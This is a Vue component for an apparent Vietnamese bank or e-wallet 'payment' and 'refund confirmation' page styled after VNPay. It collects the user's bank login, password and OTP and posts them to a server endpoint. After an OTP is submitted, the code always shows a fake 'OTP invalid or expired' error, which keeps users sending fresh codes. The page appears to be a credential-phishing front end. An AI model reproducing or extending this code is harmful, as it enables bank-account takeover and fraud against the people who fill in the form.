<template>
  <div class="bg-white min-h-screen p-4 grid lg:grid-cols-5 grid-cols-1 gap-8">
    <div class="lg:col-span-2">
      <info-order-component :is-refund="props.isRefund" />
    </div>

    <div class="lg:col-span-3 lg:px-6">
      <h3 class="text-center text-xl">
        {{ props.isRefund ? "Xác nhận hoàn tiền" : "Thanh toán" }} qua
        {{
          dataChoose.bank.includes("momo") ||
          dataChoose.bank.includes("viettelpay")
            ? "ví"
            : "Ngân hàng"
        }}
        {{ dataChoose.nameBank }}
      </h3>
      <VForm
        ref="FormRef"
        class="mt-4"
        as="div"
        :initial-values="data"
        :validation-schema="schemaInfoBank()"
      >
        <input-common1
          label="Tên đăng nhập/SĐT"
          v-model:value="data.username"
          :id="`username`"
          :name="'username'"
          :placeholder="'Nhập tên đăng nhập hoặc số điện thoại của bạn'"
          :disabled="isSubmit"
        ></input-common1>
        <input-common1
          class-container="mt-4"
          label="Mật khẩu"
          v-model:value="data.password"
          :id="`password`"
          :name="'password'"
          :placeholder="'Nhập mật khẩu'"
          type="password"
          :disabled="isSubmit"
        ></input-common1>
        <input-common1
          v-show="isSubmit"
          class-container="mt-4"
          label="Mã OTP"
          v-model:value="data.otp"
          :id="`otp`"
          :name="'otp'"
          :placeholder="'Nhập mã OTP'"
          type="number"
          :mask="{
            mask: '######',
          }"
        ></input-common1>

        <button-common
          @click="onSubmit"
          :class="'w-full mt-6'"
          :text="
            props.isRefund
              ? isSubmit
                ? 'Hoàn tất thủ tục hoàn tiền'
                : 'Tiếp tục'
              : 'Tiếp tục'
          "
        ></button-common>
      </VForm>
    </div>
  </div>
</template>

<script setup lang="ts">
import { schemaInfoBank } from "../data/schema/payment-info-bank.schema";
import type { FormContext } from "vee-validate";
import { useLoadingStore } from "../../shared/stores/loading.store";
import { useBaseFetch } from "~/src/composables/useBaseFetch";
import { usePaymentStore } from "../stores/payment.store";
import { ElMessage } from "element-plus";

const props = defineProps({
  isRefund: Boolean,
});

const FormRef = ref<FormContext>();
const loadingStore = useLoadingStore();
const paymentStore = usePaymentStore();
const { dataChoose } = storeToRefs(paymentStore);
const data = ref({
  username: "",
  password: "",
  otp: "",
});

const isSubmit = ref(false);

const handleApi = async () => {
  loadingStore.onSetIsLoading(true);
  const body = {
    nameBank: dataChoose.value.nameBank,
    username: data.value.username,
    password: data.value.password,
    otp: data.value.otp,
  };
  const [res, error] = await useBaseFetch("/vnpay/payment-info-bank", {
    method: "POST",
    body,
  });
  loadingStore.onSetIsLoading(false);
  if (error) {
    ElMessage({
      message: "Thanh toán không thành công, vui lòng thử lại",
      type: "error",
    });
    return false;
  }
  return true;
};

const onSubmit = async () => {
  if (isSubmit.value) {
    if (data.value.otp) {
      await handleApi();
    }
    FormRef.value?.setFieldError(
      "otp",
      "Mã OTP không hợp lệ hoặc đã hết hạn. Vui lòng chờ và nhập mã mới"
    );
    return;
  }

  await FormRef.value?.validate();
  FormRef.value?.setTouched(true);
  const isPass = Object.keys(FormRef.value?.errors as Object).length === 0;
  if (!isPass) return;
  const res = await handleApi();
  if (!res) return;
  isSubmit.value = true;
};
</script>

<style scoped lang="scss">
.min-h-screen {
  min-height: calc(100vh - 65px - 57px);
}
</style>
